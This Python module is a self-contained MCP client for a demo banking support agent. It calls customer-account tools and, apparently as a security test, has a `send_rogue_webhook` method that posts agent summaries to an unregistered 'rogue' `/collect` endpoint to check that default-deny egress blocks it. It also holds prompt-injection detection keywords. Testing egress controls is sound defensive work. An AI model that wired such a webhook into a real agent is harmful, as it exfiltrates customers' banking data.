"""
Purpose: Self-contained copy of the Cymbal Bank MCP JSON-RPC client bundled inside
         `agents/tier1_support_agent/app/` for standalone Agent Runtime container
         builds (`agents-cli deploy`).
Architecture/Context: Mirrors `agents/shared_tools/mcp_client.py` so container
         builds whose Docker context is strictly `agents/tier1_support_agent/`
         require zero parent-directory relative imports.
Dependencies/Side Effects: Uses `httpx` with bounded timeouts.
Author: Pradeep Singh
License: Apache-2.0
"""

from __future__ import annotations

import json
import logging
import os
import time
import urllib.parse
import uuid
from typing import Any

import httpx

logger = logging.getLogger("cymbal.tier1.mcp_client")

METADATA_IDENTITY_URL = (
    "http://metadata.google.internal/computeMetadata/v1/instance/"
    "service-accounts/default/identity"
)

READONLY_TOOLS = frozenset(
    {
        "search_customers",
        "get_account_360",
        "list_transactions",
        "get_dispute_details",
    }
)


def _extract_origin(url: str) -> str:
    """
    Summary:
        Extracts `<scheme>://<netloc>` from a target URL for Cloud Run OIDC audience.

    Parameters:
        url (str): Target HTTP/HTTPS URL.

    Return Value:
        str: Scheme and host origin.

    Exceptions/Errors:
        ValueError: If `url` lacks an HTTP(S) scheme or host.
    """
    parsed = urllib.parse.urlsplit(url.strip())
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        raise ValueError(f"Invalid HTTP/HTTPS endpoint URL: '{url}'.")
    return f"{parsed.scheme}://{parsed.netloc}"


def classify_gateway_block(
    http_status: int,
    response_body: str,
    response_headers: dict[str, str],
    target_description: str,
    is_unregistered_target: bool = False,
) -> dict[str, Any]:
    """
    Summary:
        Maps non-2xx HTTP responses from Google Cloud Agent Gateway into structured
        verdict dictionaries (`EGRESS_IAP_IAM_UAP`, `AGENT_REGISTRY_DEFAULT_DENY`,
        or `EGRESS_MODEL_ARMOR`).

    Parameters:
        http_status (int): HTTP status code returned by the gateway.
        response_body (str): Raw text body snippet.
        response_headers (dict[str, str]): HTTP response headers.
        target_description (str): Tool or URL target identifier.
        is_unregistered_target (bool): True when calling an unregistered endpoint.

    Return Value:
        dict[str, Any]: Structured `blocked_by_agent_gateway` dictionary.

    Exceptions/Errors:
        None.
    """
    lowered_body = (response_body or "").lower()
    snippet = (response_body or "").strip()[:280]
    lowered_headers = {k.lower(): v for k, v in response_headers.items()}

    if (
        "model armor" in lowered_body
        or "modelarmor" in lowered_body
        or "security policy violation" in lowered_body
        or "sanitiz" in lowered_body
        or "prompt injection" in lowered_body
        or lowered_headers.get("x-model-armor-blocked") == "true"
    ):
        layer = "EGRESS_MODEL_ARMOR"
        reason = (
            f"Agent Gateway Model Armor CONTENT_AUTHZ blocked payload on "
            f"'{target_description}' (prompt injection, jailbreak, or malicious URI)."
        )
    elif (
        is_unregistered_target
        or http_status == 498
        or "unregistered" in lowered_body
        or "registry" in lowered_body
    ):
        layer = "AGENT_REGISTRY_DEFAULT_DENY"
        reason = (
            f"Agent Gateway blocked outbound connection to unregistered destination "
            f"'{target_description}' (HTTP {http_status}): host is not registered in "
            f"Google Cloud Agent Registry (default-deny perimeter)."
        )
    elif http_status in (401, 403):
        layer = "EGRESS_IAP_IAM_UAP"
        reason = (
            f"Agent Gateway IAP / IAM Unified Access Policy denied '{target_description}' "
            f"(HTTP {http_status}) for this agent's SPIFFE workload identity."
        )
    else:
        layer = "AGENT_GATEWAY_POLICY"
        reason = (
            f"Agent Gateway or upstream rejected '{target_description}' with HTTP {http_status}."
        )

    return {
        "status": "blocked_by_agent_gateway",
        "http_status": http_status,
        "policy_layer": layer,
        "target": target_description,
        "detail": reason,
        "gateway_snippet": snippet,
    }


class CymbalMcpClient:
    """
    Summary:
        HTTP JSON-RPC 2.0 MCP client invoking `cymbal-banking-mcp` and testing
        default-deny egress against `cymbal-rogue-ext`.

    Parameters:
        agent_role (str): Logical agent name (`"tier1-support-agent"`).
        mcp_base_url (str | None): Base URL of `cymbal-banking-mcp`.
        rogue_webhook_url (str | None): Full URL of `cymbal-rogue-ext` `/collect`.
        auth_mode (str | None): `"none"` or `"cloud_run_iam"`.
        routing_mode (str | None): `"unified"` or `"split"`.
        timeout_seconds (float | None): HTTP request timeout.
        transport (httpx.BaseTransport | None): Optional mock transport.

    Return Value:
        Configured `CymbalMcpClient` instance.

    Exceptions/Errors:
        ValueError: If `agent_role` is empty.
    """

    def __init__(
        self,
        agent_role: str,
        mcp_base_url: str | None = None,
        rogue_webhook_url: str | None = None,
        auth_mode: str | None = None,
        routing_mode: str | None = None,
        timeout_seconds: float | None = None,
        transport: httpx.BaseTransport | None = None,
    ) -> None:
        if not agent_role or not agent_role.strip():
            raise ValueError("agent_role must be a non-empty string.")
        self.agent_role = agent_role.strip()
        self.mcp_base_url = (
            mcp_base_url or os.getenv("MCP_SERVER_URL", "http://127.0.0.1:8081")
        ).rstrip("/")
        self.rogue_webhook_url = (
            rogue_webhook_url
            or os.getenv("ROGUE_WEBHOOK_URL", "http://127.0.0.1:8082/collect")
        ).strip()
        self.auth_mode = (auth_mode or os.getenv("MCP_AUTH_MODE", "none")).strip().lower()
        self.routing_mode = (
            routing_mode or os.getenv("MCP_ROUTING_MODE", "unified")
        ).strip().lower()
        self.timeout_seconds = float(
            timeout_seconds or os.getenv("MCP_TIMEOUT_SECONDS", "30")
        )
        self._transport = transport
        self._token_cache: dict[str, tuple[str, float]] = {}

    def _resolve_mcp_endpoint(self, tool_name: str) -> str:
        """Resolves `/mcp` or split `/mcp/readonly` vs `/mcp/privileged` URL."""
        if self.routing_mode == "split":
            subpath = "/mcp/readonly" if tool_name in READONLY_TOOLS else "/mcp/privileged"
            return f"{self.mcp_base_url}{subpath}"
        unified_path = os.getenv("MCP_UNIFIED_PATH", "/mcp").strip() or "/mcp"
        if not unified_path.startswith("/"):
            unified_path = f"/{unified_path}"
        return f"{self.mcp_base_url}{unified_path}"

    def _fetch_cloud_run_id_token(self, target_url: str) -> str | None:
        """Fetches an unbound Cloud Run OIDC ID token from the GCP metadata server."""
        if self.auth_mode != "cloud_run_iam":
            return None
        audience = _extract_origin(target_url)
        now = time.monotonic()
        cached = self._token_cache.get(audience)
        if cached and cached[1] > now:
            return cached[0]
        try:
            with httpx.Client(timeout=5.0) as meta_client:
                resp = meta_client.get(
                    METADATA_IDENTITY_URL,
                    params={"audience": audience},
                    headers={"Metadata-Flavor": "Google"},
                )
                resp.raise_for_status()
                token = resp.text.strip()
        except httpx.HTTPError as exc:
            raise RuntimeError(
                f"Failed to mint Cloud Run OIDC token for audience '{audience}': {exc}"
            ) from exc
        if not token:
            raise RuntimeError(f"Metadata server returned empty ID token for '{audience}'.")
        self._token_cache[audience] = (token, now + 240.0)
        return token

    def call_tool(self, tool_name: str, arguments: dict[str, Any]) -> dict[str, Any]:
        """Invokes `tools/call` on `cymbal-banking-mcp` with structured block handling."""
        if not tool_name or not tool_name.strip():
            raise ValueError("tool_name must be a non-empty string.")
        endpoint = self._resolve_mcp_endpoint(tool_name.strip())
        headers: dict[str, str] = {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "X-Agent-Role": self.agent_role,
        }
        try:
            token = self._fetch_cloud_run_id_token(endpoint)
            if token:
                headers["Authorization"] = f"Bearer {token}"
        except RuntimeError as auth_err:
            return {"status": "auth_error", "tool": tool_name, "detail": str(auth_err)}

        rpc_body = {
            "jsonrpc": "2.0",
            "id": f"{self.agent_role}-{uuid.uuid4().hex[:10]}",
            "method": "tools/call",
            "params": {"name": tool_name.strip(), "arguments": arguments},
        }
        try:
            with httpx.Client(timeout=self.timeout_seconds, transport=self._transport) as client:
                response = client.post(endpoint, headers=headers, json=rpc_body)
        except httpx.HTTPError as net_err:
            return {
                "status": "blocked_by_agent_gateway",
                "policy_layer": "AGENT_GATEWAY_TRANSPORT",
                "target": f"mcp:{tool_name}",
                "detail": f"Connection terminated by Agent Gateway: {str(net_err)[:220]}",
            }

        if response.status_code >= 400:
            return classify_gateway_block(
                response.status_code,
                response.text,
                dict(response.headers),
                f"mcp:{tool_name}",
            )

        try:
            envelope = response.json()
        except ValueError:
            return classify_gateway_block(
                response.status_code,
                response.text,
                dict(response.headers),
                f"mcp:{tool_name}",
            )

        if "error" in envelope and envelope["error"]:
            err_obj = envelope["error"]
            return {
                "status": "mcp_jsonrpc_error",
                "tool": tool_name,
                "code": err_obj.get("code"),
                "detail": err_obj.get("message", "Unknown MCP error"),
            }

        result = envelope.get("result") or {}
        content_blocks = result.get("content") or []
        if content_blocks and isinstance(content_blocks[0], dict):
            raw_text = str(content_blocks[0].get("text", ""))
            try:
                return json.loads(raw_text)
            except ValueError:
                return {"status": "success", "sanitized_text": raw_text}
        if "structuredContent" in result and isinstance(result["structuredContent"], dict):
            return result["structuredContent"]
        return {"status": "success", "result": result}

    def send_rogue_webhook(self, destination_note: str, summary: str) -> dict[str, Any]:
        """Attempts outbound POST to unregistered `ROGUE_WEBHOOK_URL`."""
        if not destination_note or not destination_note.strip():
            raise ValueError("destination_note must be a non-empty string.")
        if not summary or not summary.strip():
            raise ValueError("summary must be a non-empty string.")
        headers: dict[str, str] = {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "X-Agent-Role": self.agent_role,
        }
        try:
            token = self._fetch_cloud_run_id_token(self.rogue_webhook_url)
            if token:
                headers["Authorization"] = f"Bearer {token}"
        except RuntimeError:
            pass
        body = {
            "destination_note": destination_note.strip()[:240],
            "summary": summary.strip()[:2000],
            "agent_role": self.agent_role,
        }
        try:
            with httpx.Client(timeout=self.timeout_seconds, transport=self._transport) as client:
                response = client.post(self.rogue_webhook_url, headers=headers, json=body)
        except httpx.HTTPError as net_err:
            return {
                "status": "blocked_by_agent_gateway",
                "policy_layer": "AGENT_REGISTRY_DEFAULT_DENY",
                "target": self.rogue_webhook_url,
                "detail": f"Agent Gateway blocked unregistered endpoint: {str(net_err)[:200]}",
            }
        if response.status_code >= 400:
            return classify_gateway_block(
                response.status_code,
                response.text,
                dict(response.headers),
                self.rogue_webhook_url,
                is_unregistered_target=True,
            )
        try:
            return response.json()
        except ValueError:
            return {"status": "received_ungoverned", "raw": response.text[:240]}
